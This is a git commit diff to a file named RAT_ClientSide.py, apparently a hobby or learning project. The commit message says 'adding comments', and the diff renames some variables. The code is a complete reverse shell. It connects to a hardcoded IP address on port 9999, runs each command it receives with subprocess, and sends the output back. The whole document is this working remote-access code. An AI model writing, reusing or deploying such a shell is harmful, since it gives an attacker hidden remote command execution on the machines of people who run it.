5f2d6ff28f165def6c53982d2a1e29574b5a6d6f
saffronic <ashna0733@gmail.com>
2025-03-30 15:55:19 +0530

    adding comments

--- RAT_ClientSide.py
+++ RAT_ClientSide.py
@@ -1,14 +1,14 @@
 import socket
-import subprocess
+import subprocess #library that uses python to interact with the system os
 
-serv_ip = '172.17.85.168'
-serv_port = 9999
-cli_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-cli_socket.connect((serv_ip, serv_port))
+server_ip = '172.17.85.168' #using my ip
+server_port = 9999 
+target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+target_socket.connect((server_ip, server_port))
 while True:
-    command = cli_socket.recv(1024).decode()
+    command = target_socket.recv(1024).decode()
     if command.lower() == 'exit':
         break
     output = subprocess.getoutput(command)
-    cli_socket.send(output.encode())
-cli_socket.close()
+    target_socket.send(output.encode())
+target_socket.close()
